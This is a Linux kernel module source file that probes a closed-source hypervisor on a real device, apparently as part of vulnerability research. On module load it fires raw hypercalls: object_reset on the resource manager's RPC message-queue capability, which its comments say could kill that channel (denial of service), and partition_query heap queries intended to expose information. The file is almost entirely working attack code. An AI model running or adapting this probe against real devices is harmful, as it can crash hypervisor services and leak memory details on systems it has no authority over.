// gh_hvc17.c — probe real-device (closed-source EL2) hypercall behaviors:
//  1) object_reset (0xe) on the RM RPC msgqueue cap (could kill RM RPC
//     channel -> RM DoS, test-case #17)
//  2) partition_query (0x76) heap queries on various caps (info exposure, #18)
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static unsigned long msgq_cap = 0x585b34c8a8358d29UL;
module_param(msgq_cap, ulong, 0644);

static u64 hvc3(u64 fn, u64 a1, u64 a2, u64 a3)
{
	register u64 x0 __asm__("x0") = fn;
	register u64 x1 __asm__("x1") = a1;
	register u64 x2 __asm__("x2") = a2;
	register u64 x3 __asm__("x3") = a3;
	register u64 x4 __asm__("x4") = 0;
	register u64 x5 __asm__("x5") = 0;
	__asm__ volatile("hvc #0"
			 : "+r"(x0)
			 : "r"(x1), "r"(x2), "r"(x3), "r"(x4), "r"(x5)
			 : "memory");
	return x0;
}

static int __init gh_hvc17_init(void)
{
	u64 r;

	pr_info("GHHVC17: init msgq_cap=%#lx\n", msgq_cap);

	/* 1) object_reset on RM RPC msgqueue cap */
	r = hvc3(0xc600800eUL, msgq_cap, 0, 0);
	pr_info("GHHVC17: object_reset(msgq_cap) ret=%#llx\n",
		(unsigned long long)r);

	/* 2) partition_query (0x76): flags=0 (HEAP_IS_FREE), addr=0x80000000,
	 *    size=0x1000, on msgq cap (probably wrong type -> error is data) */
	r = hvc3(0xc6008076UL, msgq_cap, 0, 0x80000000UL);
	pr_info("GHHVC17: partition_query(HEAP_IS_FREE, cap=msgq) ret=%#llx\n",
		(unsigned long long)r);
	r = hvc3(0xc6008076UL, msgq_cap, 0x1000, 0x80000000UL);
	pr_info("GHHVC17: partition_query(size, cap=msgq) ret=%#llx\n",
		(unsigned long long)r);
	/* flags type=1 HEAP_STATS: type in flags low bits */
	r = hvc3(0xc6008076UL, msgq_cap, 1, 0x80000000UL);
	pr_info("GHHVC17: partition_query(HEAP_STATS, cap=msgq) ret=%#llx\n",
		(unsigned long long)r);

	/* 3) raw 0x6000-0x6080 scan would be too noisy; sample a few */
	r = hvc3(0xc600800dUL, msgq_cap, 0, 0); /* object_release? */
	pr_info("GHHVC17: hvc 0x800d ret=%#llx\n", (unsigned long long)r);
	return 0;
}

static void __exit gh_hvc17_exit(void) {}

module_init(gh_hvc17_init);
module_exit(gh_hvc17_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Probe real-device hypercalls: object_reset/partition_query");
